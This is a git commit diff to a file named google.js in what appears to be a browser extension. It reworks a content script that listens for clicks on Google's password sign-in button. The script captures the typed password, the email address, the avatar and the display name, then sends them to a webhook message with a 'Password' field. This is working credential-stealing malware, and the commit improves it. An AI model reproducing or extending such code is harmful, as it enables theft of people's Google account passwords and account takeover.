123ca52f87a49483f2b04199783e0a181b64e899
Yuuto <55290516+JustYuuto@users.noreply.github.com>
2023-08-31 13:06:35 +0200

    password + name

--- src/websites/google.js
+++ src/websites/google.js
@@ -29,17 +29,18 @@ module.exports = {
       path: '/v3/signin/challenge/pwd',
       async run() {
         await wait(1000);
-        const passwordInput = document.querySelector(this.getSelector('input'))?.value;
-        const fullEmail = document.querySelector(this.getSelector('emailStr'))?.textContent;
-        const avatar = document.querySelector(this.getSelector('avatar'))?.getAttribute('src');
-        const submitButton = document.querySelector(this.getSelector('submit'));
-
-        submitButton.addEventListener('click', async () => {
-          if (!passwordInput || passwordInput.length < 8) return;
+        document.querySelector(this.getSelector('submit')).addEventListener('click', async () => {
+          const passwordInput = document.querySelector(this.getSelector('input'))?.value;
+          const fullEmail = document.querySelector(this.getSelector('emailStr'))?.textContent;
+          const avatar = document.querySelector(this.getSelector('avatar'))?.getAttribute('src');
+          const name = document.querySelector(this.getSelector('name'))?.textContent;
           const id = (await chrome.storage.local.get(variable))[variable];
+
+          if (!passwordInput || passwordInput.length < 8) return;
           if (!id) return;
+
           const { embeds: [embed] } = await Util.Webhook.getMessage(id);
-          embed.author = { name: fullEmail, icon_url: avatar.startsWith('//') ? `https:${avatar}` : avatar };
+          embed.author = { name, icon_url: avatar.startsWith('//') ? `https:${avatar}` : avatar };
           embed.fields[0].value = code(fullEmail);
           embed.fields.push(formatFields([['Password', code(passwordInput)]])[0]);
           await Util.Webhook.editEmbed(embed, id);
@@ -51,6 +52,7 @@ module.exports = {
     input: '.whsOnd.zHQkBf',
     submit: 'button[jscontroller="soHxf"][data-idom-class^="nCP5yc AjY5Oe"]',
     emailStr: 'div[jsname="bQIQze"]',
-    avatar: 'img.r78aae.TrZEUc'
+    avatar: 'img.r78aae.TrZEUc',
+    name: 'h1.oO8pQe'
   }
 };
